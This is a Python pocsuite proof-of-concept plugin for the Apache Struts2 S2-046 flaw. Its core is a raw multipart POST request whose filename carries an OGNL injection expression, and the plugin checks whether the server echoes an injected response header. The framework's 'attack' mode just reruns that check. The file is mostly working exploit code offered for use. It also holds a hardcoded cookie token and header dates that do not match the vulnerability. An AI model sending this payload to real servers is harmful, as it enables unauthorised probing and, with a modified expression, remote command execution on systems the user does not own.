#!/usr/bin/python
# -*- coding: utf-8 -*-


from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import urlparse
import random
import hackhttp

class Struts46POC(POCBase):
    name = 'struts046'
    vulID = '0'  
    author = ['bey0nd']
    vulType = 'Command Execution'
    version = '1.0'    # default version: 1.0
    references = ['']
    desc = '''struts2-046'''

    vulDate = '2013-02-14'
    createDate = '2013-02-14'
    updateDate = '2013-02-14'

    appName = 'struts'
    appVersion = 'struts'
    appPowerLink = 'struts'
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        try:
            if self.check_vuln(self.url):
                result['FileInfo'] = {}
                result['FileInfo']['Filename'] = "st046"
        except Exception as e:
            pass
        
        return self.parse_output(result)

    def check_vuln(self,arg):
        curl = hackhttp.hackhttp()
        uri = urlparse.urlparse(arg).path
        randint1 = random.randint(1000, 10000)
        raw = """POST {uri} HTTP/1.1
Accept-Encoding: identity
Content-Length: 171
Cookie: access_token=a049bd87-d8c6-4756-aa6a-46a357a8de36;
Content-Type: multipart/form-data; boundary=1c88e9afa73c438d93b5043a7096b207
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36

--1c88e9afa73c438d93b5043a7096b207
Content-Disposition: form-data; name="image1"; filename="%{{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test-{randint1}','bey0nd')}}'\x00b"
Content-Type: text/plain


--1c88e9afa73c438d93b5043a7096b207--
    """.format(uri=uri, randint1=str(randint1))
        code, head, html, redir, log= curl.http(arg, raw=raw)
        # print head
        if  code != 0  and "X-Test-%s" % str(randint1) in head:
            return True
        else:
            return False
    

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Failed')
        return output

register(Struts46POC)
